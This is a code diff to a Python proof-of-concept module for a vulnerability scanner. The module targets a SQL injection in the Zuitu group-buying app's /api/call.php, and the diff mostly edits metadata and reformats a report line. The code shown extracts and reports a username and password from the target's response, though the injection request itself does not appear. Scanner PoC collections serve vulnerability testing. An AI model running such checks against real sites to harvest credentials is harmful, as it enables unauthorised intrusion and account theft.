@@ -5,18 +5,19 @@ import urllib2
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
-    vuln_id = 'Unkonwn' # 平台漏洞编号，留空
-    name = '最土团购 /api/call.php SQL注入漏洞' # 漏洞名称
+    vuln_id = 'Zuitu_1000' # 平台漏洞编号，留空
+    name = '最土团购 /api/call.php SQL注入' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
     disclosure_date = '2014-10-03'  # 漏洞公布时间
     desc = '''
-     最土团购 /api/call.php SQL注入漏洞
+     最土团购 /api/call.php SQL注入漏洞。
     ''' # 漏洞描述
     ref = 'http://www.moonsec.com/post-11.html' # 漏洞来源
     cnvd_id = 'Unkonwn' # cnvd漏洞编号
     product = '最土团购'  # 漏洞应用名称
-    product_version = '*'  # 漏洞应用版本
+    product_version = 'Unkonwn'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'e447b5b5-7148-45dd-9722-59df619fa059'
@@ -40,12 +41,12 @@ class Poc(ABPoc):
             if match != None:
                 user = match.group("username")
                 passwd = match.group("password")
-                self.output.report(self.vuln, '目标{target}存在{name}漏洞，获取到用户名{user}密码{passwd}'.format(target=self.target,
-                                                                                                   name=self.vuln.name,
-                                                                                                   user=user,
-                                                                                                   passwd=passwd))
+                self.output.report(self.vuln, '目标{target}存在{name}漏洞，获取到用户名{user}密码{passwd}'.format(
+                    target=self.target, name=self.vuln.name, user=user, passwd=passwd))
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
     def exploit(self):
         self.verify()
 
